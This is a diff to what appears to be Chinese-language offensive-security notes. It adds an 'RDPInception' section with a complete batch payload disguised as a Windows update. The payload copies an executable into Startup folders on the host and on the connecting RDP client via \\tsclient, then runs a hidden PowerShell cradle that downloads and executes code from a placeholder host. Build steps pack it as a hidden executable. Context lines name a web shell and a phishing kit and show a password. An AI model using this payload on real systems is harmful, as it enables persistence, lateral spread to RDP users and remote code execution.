@@ -34,3 +34,45 @@ Pass: `vJrqJeJo2n005FF*`
 + HighShell（另一个Web shell）
 + Fox Panel（网络钓鱼套件）
 + Webmask（DNS隧道，DNSpionage背后的主要工具）
+
+## RDPInception
+Bat To Exe转换器添加如下代码保存`windows.bat`
+```
+@echo off
+
+echo Updating Windows ...
+
+@echo off
+timeout 1 >nul 2>&1
+
+mkdir \\tsclient\c\temp >nul 2>&1
+mkdir C:\temp >nul 2>&1
+
+copy windows.exe C:\temp >nul 2>&1
+copy windows.exe \\tsclient\c\temp >nul 2>&1
+
+del /q %TEMP%\temp_00.txt >nul 2>&1
+
+set dirs=dir /a:d /b /s C:\users\*Startup*
+set dirs2=dir /a:d /b /s \\tsclient\c\users\*startup*
+
+echo|%dirs%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"
+echo|%dirs2%|findstr /i "Microsoft\Windows\Start Menu\Programs\Startup">>"%TEMP%\temp_00.txt"
+
+for /F "tokens=*" %%a in (%TEMP%\temp_00.txt) DO (
+	copy windows.exe "%%a" >nul 2>&1
+	copy C:\temp\windows.exe "%%a" >nul 2>&1
+	copy \\tsclient\c\temp\windows.exe "%%a" >nul 2>&1
+)
+
+del /q %TEMP%\temp_00.txt >nul 2>&1
+
+powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://x.x.x.x'))"
+```
+选项：
+
++ 工作目录：当前
++ EXE格式：32位windows隐藏
++ 嵌入式提取到：临时目录
+
+转换bat保存为`windows.exe`,编辑`windows.bat`嵌入添加`windows.exe`重新转换为最终成品windows.exe
